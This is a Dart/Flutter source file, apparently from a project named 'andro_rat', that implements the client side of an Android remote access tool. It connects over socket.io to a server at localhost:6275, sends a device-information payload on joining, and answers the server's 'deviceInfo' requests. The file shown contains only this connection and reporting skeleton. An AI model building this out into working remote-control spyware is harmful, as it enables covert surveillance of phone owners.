import 'package:flutter_workspace/andro_rat/device_info.dart';
import 'package:flutter_workspace/andro_rat/utils.dart';
import 'package:socket_io_client/socket_io_client.dart' as IO;


Future<void> main() async {
  SocketConnection socketConnection = SocketConnection("http://localhost:6275");
  socketConnection.init();
}

class SocketConnection {
  final String _url;
  late IO.Socket _socket;
  
  SocketConnection(this._url) {
    _socket = IO.io(_url, <String, dynamic> {
      "autoConnect": false,
      "transports": ["websocket"],
    });
  }
  
  void init() {
    _socket.onConnect((_) async {
      print('[Connected]');
      // print("_");
      DeviceInfo deviceInfo = DeviceInfo();
      var info = await deviceInfo.getPayload();
      print(info);
      if (Utils.isMobilePlatform()) {
        _socket.emit("join", info);
      }
    });
    _socket.onError((err) {
      print(err);
    });
    _socket.onConnectError((conErr) {
      print(conErr);
    });
    _socket.onDisconnect((_) {
      print("[Disconnected]");
      // print(_);
    });

    _socket.on("deviceInfo", (_) async {
      _socket.emit("deviceInfo", await DeviceInfo().getPayload());
    });

    _socket.connect();
  }
  
  bool isConnected() {
    return _socket.connected;
  }
  
}
